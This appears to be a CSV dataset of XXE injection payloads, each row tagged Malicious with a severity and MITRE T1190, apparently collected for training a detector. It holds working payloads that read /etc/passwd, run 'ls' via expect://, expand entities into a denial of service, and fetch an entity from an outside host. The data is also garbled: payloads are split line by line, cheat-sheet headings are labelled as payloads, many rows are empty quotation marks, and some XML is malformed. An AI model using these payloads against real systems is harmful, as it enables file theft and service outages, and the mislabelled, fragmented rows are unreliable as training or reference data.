Payload,Signature,AttackType,Severity,MITRE,Label,Description
</soap:Body>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" width=""300"" version=""1.1"" height=""200"">",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"<image xlink:href=""expect://ls""></image>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</svg>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Critical,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
" """,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
" """,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
" """,XXE,XXE,Critical,T1190,Malicious,XXE payload from comprehensive dataset
" """,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
" """,XXE,XXE,Critical,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,High,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
# XML External Entity (XXE) Injection Payloads,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
* XXE : Classic XXE,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE data [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<!ELEMENT data (#ANY)>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
]>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<data>&file;</data>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0"" encoding=""ISO-8859-1""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
  <!DOCTYPE foo [  ,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
  <!ELEMENT foo ANY >,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0"" encoding=""ISO-8859-1""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [  ,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
  <!ELEMENT foo ANY >,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE,XXE,High,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0"" encoding=""ISO-8859-1""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [  ,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
  <!ELEMENT foo ANY >,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE,XXE,High,T1190,Malicious,XXE payload from comprehensive dataset
* XXE: Basic XML Example,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!--?xml version=""1.0"" ?-->",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
 <firstName>John</firstName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
 <lastName>Doe</lastName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
*  XXE: Entity Example,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!--?xml version=""1.0"" ?-->",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!DOCTYPE replace [<!ENTITY example ""Doe""> ]>",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
 <userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
  <firstName>John</firstName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
  <lastName>&example;</lastName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
 </userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
*  XXE: File Disclosure,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!--?xml version=""1.0"" ?-->",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
 <firstName>John</firstName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
 <lastName>&ent;</lastName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
* XXE: Denial-of-Service Example,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!--?xml version=""1.0"" ?-->",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!DOCTYPE lolz [<!ENTITY lol ""lol""><!ELEMENT lolz (#PCDATA)>",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"  <!ENTITY lol1 ""&lol;&lol;&lol;&lol;&lol;&lol;&lol;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"  <!ENTITY lol2 ""&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"  <!ENTITY lol3 ""&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"  <!ENTITY lol4 ""&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"  <!ENTITY lol5 ""&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"  <!ENTITY lol6 ""&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"  <!ENTITY lol7 ""&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"  <!ENTITY lol8 ""&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"  <!ENTITY lol9 ""&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
]>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<tag>&lol9;</tag>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
* XXE: Local File Inclusion Example,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [  ,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<!ELEMENT foo (#ANY)>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
* XXE: Blind Local File Inclusion Example (When first case doesn't return anything.),XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<!ELEMENT foo (#ANY)>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
* XXE: Access Control Bypass (Loading Restricted Resources - PHP example),XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<foo><result>&ac;</result></foo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
* XXE:SSRF ( Server Side Request Forgery ) Example,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [  ,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<!ELEMENT foo (#ANY)>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
*  XXE: (Remote Attack - Through External Xml Inclusion) Exmaple,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE lolz [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY test SYSTEM ""https://example.com/entity1.xml"">]>",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<lolz><lol>3..2..1...&test<lol></lolz>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
* XXE: UTF-7 Exmaple,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0"" encoding=""UTF-7""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
* XXE: Base64 Encoded,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!DOCTYPE test [ <!ENTITY % init SYSTEM ""data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk""> %init; ]><foo/>",XXE,XXE,High,T1190,Malicious,XXE payload from comprehensive dataset
* XXE: XXE inside SOAP Example,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<soap:Body>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
  <foo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
  </foo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</soap:Body>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
* XXE: XXE inside SVG,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" width=""300"" version=""1.1"" height=""200"">",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"    <image xlink:href=""expect://ls""></image>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</svg>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!--?xml version=""1.0"" ?-->",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<firstName>John</firstName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<lastName>Doe</lastName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!--?xml version=""1.0"" ?-->",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!DOCTYPE replace [<!ENTITY example ""Doe""> ]>",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<firstName>John</firstName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<lastName>&example;</lastName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!--?xml version=""1.0"" ?-->",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<firstName>John</firstName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<lastName>&ent;</lastName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!--?xml version=""1.0"" ?-->",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!DOCTYPE lolz [<!ENTITY lol ""lol""><!ELEMENT lolz (#PCDATA)>",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol1 ""&lol;&lol;&lol;&lol;&lol;&lol;&lol;",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol2 ""&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol3 ""&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol4 ""&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol5 ""&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol6 ""&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol7 ""&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol8 ""&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol9 ""&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<tag>&lol9;</tag>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<!ELEMENT foo (#ANY)>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<!ELEMENT foo (#ANY)>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<foo><result>&ac;</result></foo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<!ELEMENT foo (#ANY)>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE lolz [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY test SYSTEM ""https://example.com/entity1.xml"">]>",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<lolz><lol>3..2..1...&test<lol></lolz>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0"" encoding=""UTF-7""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!DOCTYPE test [ <!ENTITY % init SYSTEM ""data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk""> %init; ]><foo/>",XXE,XXE,High,T1190,Malicious,XXE payload from comprehensive dataset
<soap:Body>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<foo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
</foo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</soap:Body>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" width=""300"" version=""1.1"" height=""200"">",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"<image xlink:href=""expect://ls""></image>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</svg>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Critical,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
" """,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
" """,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
" """,XXE,XXE,Critical,T1190,Malicious,XXE payload from comprehensive dataset
" """,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
" """,XXE,XXE,Critical,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,High,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
